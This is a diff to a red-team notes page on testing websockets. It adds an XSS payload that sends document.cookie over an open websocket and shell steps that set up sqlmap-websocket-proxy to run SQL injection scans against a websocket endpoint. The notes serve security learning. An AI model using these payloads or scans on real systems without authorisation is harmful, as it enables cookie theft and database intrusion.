@@ -16,9 +16,39 @@ socket.onmessage = message => console.log("Received: " + message.data);
 socket.send('test');
 ```
 
-You can explore the websocket traffic from the network tab.
+You can explore the websocket traffic from the network tab/Burp.
 </div><div>
 
 Depending on how services are integrated with websockets, [XSS](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md)/[CSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/csrf.md) and [SQLi](/cybersecurity/red-team/s3.exploitation/vulns/injection/sqli.md) attacks might be possible.
 
+```html!
+<img src="" onerror="socket.send(document.cookie)">
+```
+
+Using SQLMap with websockets may not work. We can try [sqlmap-websocket-proxy](https://github.com/BKreisel/sqlmap-websocket-proxy) <small>(0.1k ⭐)</small>, but it's more efficient to write your own <small>(reuse socket, unify results for SQLMap, handle special attacks, etc.)</small>.
+
+```shell!
+$ pipx install git+https://github.com/BKreisel/sqlmap-websocket-proxy
+$ DEST="$HOME/tools/sqlmap-websocket-proxy"
+$ git clone -b "main" https://github.com/BKreisel/sqlmap-websocket-proxy.git $DEST
+$ # do any changes to the code
+$ pipx install $DEST # or reinstall if already installed
+$ sqlmap-websocket-proxy -u 'ws://IP:port/testdb' -d '{"parameter":"%param%"}' -p 1337
+$ sqlmap -u 'http://localhost:1337/?param1=1*' [...]
+```
+
+</div></div>
+
+<hr class="sep-both">
+
+## 👻 To-do 👻
+
+Stuff that I found, but never read/used yet.
+
+<div class="row row-cols-lg-2"><div>
+
+* [The WebSocket Handbook](https://pages.ably.com/hubfs/the-websocket-handbook.pdf)
+* `Sec-WebSocket-Version`
+* `Sec-WebSocket-Key: base64encodedkey`
+</div><div>
 </div></div>
